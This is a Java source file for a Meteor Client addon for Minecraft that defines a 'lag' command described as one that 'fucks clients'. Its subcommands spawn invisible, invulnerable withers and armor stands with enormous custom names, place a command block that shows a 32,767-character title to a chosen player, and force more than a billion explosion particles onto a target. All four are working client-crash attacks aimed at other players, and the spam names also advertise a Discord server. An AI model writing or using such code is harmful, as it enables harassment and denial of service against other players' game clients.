package me.onlyrain.randomaddon.commands;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.commands.Command;
import meteordevelopment.meteorclient.commands.arguments.PlayerArgumentType;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import net.minecraft.command.CommandSource;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import org.apache.commons.lang3.RandomStringUtils;

import java.util.Random;

import static com.mojang.brigadier.Command.SINGLE_SUCCESS;
import static meteordevelopment.meteorclient.MeteorClient.mc;

public class LagCommand extends Command {
    public LagCommand() {
        super("lag", "fucks clients");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.then(literal("bossbar").executes(ctx -> {
            if (!(mc.player.getAbilities().creativeMode)) error("you need creative");
            ItemStack bfr = mc.player.getMainHandStack();
            ItemStack egg = new ItemStack(Items.SALMON_SPAWN_EGG);
            Vec3d ppos = new Vec3d(mc.player.getX() + randpos().x - 4, mc.player.getY() + randpos().y - 4, mc.player.getZ() + randpos().z - 4);
            BlockHitResult bhr = new BlockHitResult(ppos, Direction.DOWN, BlockPos.ofFloored(ppos), false);
            for (int i = 0; i < 10; i++) {
                egg.setNbt(StringNbtReader.parse("{EntityTag:{id:\"wither\",CustomName:'[{\"text\":\"" + "discord.gg/moles".repeat(1000) + RandomStringUtils.randomAlphanumeric(5) + "\",\"obfuscated\":true}]',Invulnerable:1,NoAI:1,Silent:1,ActiveEffects:[{Amplifier:2,Duration:133333337,Id:14,ShowParticles:0}]}}"));
                mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(36 + mc.player.getInventory().selectedSlot, egg));
                mc.getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr, 0));
            }
            mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(36 + mc.player.getInventory().selectedSlot, bfr));
            return SINGLE_SUCCESS;
        }));

        builder.then(literal("hologram").executes(ctx -> {
            if (!(mc.player.getAbilities().creativeMode)) error("you need creative");
            ItemStack bfr = mc.player.getMainHandStack();
            ItemStack stand = new ItemStack(Items.PIG_SPAWN_EGG);
            Vec3d ppos = new Vec3d(mc.player.getX() + randpos().x - 4, mc.player.getY() + randpos().y - 4, mc.player.getZ() + randpos().z - 4);

            BlockHitResult bhr = new BlockHitResult(ppos, Direction.DOWN, BlockPos.ofFloored(ppos), false);
            stand.setNbt(StringNbtReader.parse("{EntityTag:{id:\"armor_stand\",CustomName:'[{\"text\":\"" + "discord.gg/moles".repeat(1000) + RandomStringUtils.randomAlphanumeric(5) + "\",\"obfuscated\":true}]',Invulnerable:1,ActiveEffects:[{Amplifier:2,Duration:133333337,Id:14,ShowParticles:0}]}}"));
            for (int i = 0; i < 25; i++) {
                mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(36 + mc.player.getInventory().selectedSlot, stand));
                mc.getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr, 0));
            }
            mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(36 + mc.player.getInventory().selectedSlot, bfr));
            return SINGLE_SUCCESS;
        }));

        builder.then(literal("title").then(argument("player", PlayerArgumentType.create()).executes(ctx -> {
            if (!mc.player.hasPermissionLevel(4)) {
                error("Must have op");
                return SINGLE_SUCCESS;
            }
            String target = PlayerArgumentType.get(ctx).getEntityName();
            ChatUtils.sendPlayerMsg("/gamerule sendCommandFeedback false");
            ChatUtils.sendPlayerMsg("/title " + target + " times 0 999999999 0");
            ChatUtils.sendPlayerMsg("/gamerule sendCommandFeedback true");
            ItemStack cmd = new ItemStack(Items.COMMAND_BLOCK);
            cmd.setNbt(StringNbtReader.parse("{BlockEntityTag:{Command:\"/title " + target + " title {\"text\":\"" + "l".repeat(32767) + "\",\"obfuscated\":true}\",powered:1b,auto:1b,conditionMet:1b}}"));
            mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(36 + mc.player.getInventory().selectedSlot, cmd));
            info("place this");
            return SINGLE_SUCCESS;
        })));

        builder.then(literal("particle").then(argument("player", PlayerArgumentType.create()).executes(ctx -> {
            String target = PlayerArgumentType.get(ctx).getEntityName();
            ChatUtils.sendPlayerMsg("/execute as " + target + " at @s run particle explosion ~ ~ ~ 1 1 1 0 1333333337 force @s");
            return SINGLE_SUCCESS;
        })));
    }

    private Vec3d randpos() {
        return new Vec3d(new Random().nextDouble(8), new Random().nextDouble(8), new Random().nextDouble(8));
    }
}
